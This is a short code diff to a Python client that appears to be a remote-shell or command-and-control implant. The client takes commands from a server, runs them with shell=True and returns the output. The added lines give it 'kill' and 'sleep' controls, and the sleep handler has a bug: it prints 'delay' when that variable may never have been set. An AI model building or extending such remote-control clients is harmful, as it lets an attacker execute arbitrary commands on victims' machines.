@@ -52,6 +52,23 @@ while True:
             send_back_to_server(f"There was an OS error on the client.\n")
         else:
             send_back_to_server(getcwd(), CWD_RESPONSE)
+    elif cmd.startswith('clkl'):
+        send_back_to_server(f"{client} has been killed.\n")
+        exit()
+
+    elif cmd.startswith('clslp '):
+        try:
+            delay = float(cmd.split()[1])
+            if delay < 0:
+                raise ValueError
+        except (IndexError, ValueError):
+            print(f"delay is : {delay}")
+            send_back_to_server("You must Enter in a positive nbr for time sleeping in sec.\n")
+        else:
+            send_back_to_server(f"{client} will sleep for {delay} seconds.\n")
+            time.sleep(delay)
+            send_back_to_server(f"{client} is now awake.\n")
+
     else:
         cmd_output = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
         send_back_to_server(cmd_output.stdout)
